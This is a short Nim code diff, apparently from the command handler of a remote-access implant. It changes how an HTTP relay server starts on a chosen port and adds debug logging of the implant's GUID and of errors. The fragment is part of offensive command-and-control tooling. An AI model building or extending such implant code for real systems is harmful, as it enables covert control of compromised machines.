@@ -1477,13 +1477,19 @@ proc httpHandler() {.async.} =
                     if result.startsWith("RELAY_START:"):
                         let port = parseInt(result.split(":")[1])
                         when defined debug:
-                            echo "[RELAY] 🚀 Starting HTTP relay server on port: " & $port
+                            echo "[RELAY] 🚀 Starting HTTP relay server on runtime port: " & $port
+                            echo "[RELAY] 🆔 Using implant GUID: " & listener.id
                         try:
-                            # Start relay server asynchronously
-                            await relay_launcher.startRelayServerAsync(listener.id)
+                            # Start relay server asynchronously with dynamic port
+                            await relay_launcher.startRelayServerWithPort(port, listener.id)
                             webClientListener.postCommandResults(listener, cmdGuid, "HTTP Relay server started on port " & $port)
+                            when defined debug:
+                                echo "[RELAY] ✅ Relay server startup completed"
                         except Exception as e:
                             webClientListener.postCommandResults(listener, cmdGuid, "Failed to start relay server: " & e.msg)
+                            when defined debug:
+                                echo "[RELAY] ❌ Failed to start relay server: " & e.msg
+                                echo "[RELAY] ❌ Stack trace: " & e.getStackTrace()
                     else:
                         webClientListener.postCommandResults(listener, cmdGuid, result)
                     
